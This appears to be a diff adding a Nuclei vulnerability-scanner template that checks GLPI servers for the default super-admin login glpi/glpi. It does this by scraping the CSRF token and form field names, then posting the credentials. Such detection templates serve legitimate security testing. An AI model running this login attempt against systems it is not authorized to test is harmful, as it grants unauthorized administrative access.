@@ -1,0 +1,71 @@
+id: glpi-default-login
+
+info:
+  name: GLPI Default Login
+  author: andysvints
+  severity: high
+  description: GLPI default login credentials were discovered. GLPI is an ITSM software tool that helps you plan and manage IT changes. This template checks if a default super admin account (glpi/glpi) is enabled.
+  reference:
+    - https://glpi-project.org/
+  classification:
+    cwe-id: CWE-798
+  metadata:
+    max-request: 2
+  tags: glpi,default-login,vuln
+
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        POST /front/login.php HTTP/1.1
+        Host: {{Hostname}}
+        Origin: {{BaseURL}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}
+
+        {{name}}={{user}}&{{password}}={{pass}}&auth=local&submit=Submit&_glpi_csrf_token={{token}}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - glpi
+      pass:
+        - glpi
+
+    extractors:
+      - type: regex
+        name: token
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "hidden\" name=\"_glpi_csrf_token\" value=\"([0-9a-z]+)\""
+
+      - type: regex
+        name: name
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "type=\"text\" name=\"([0-9a-z]+)\" id=\"login_name\" required=\"required\""
+
+      - type: regex
+        name: password
+        part: body
+        internal: true
+        group: 1
+        regex:
+          - "type=\"password\" name=\"([0-9a-z]+)\" id=\"login_password\" required=\"required\""
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - '<title>GLPI - Standard Interface</title>'
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a0047304502201558489c6cf1b97723bdaf8bd837817f6fef433570cfdd5f0316c91d1fe8bf89022100864342826cbcf2ab960b4a67135d79636296579a501dcd3dba9f53d762ae2909:922c64590222798bb761d5b6d8e72950
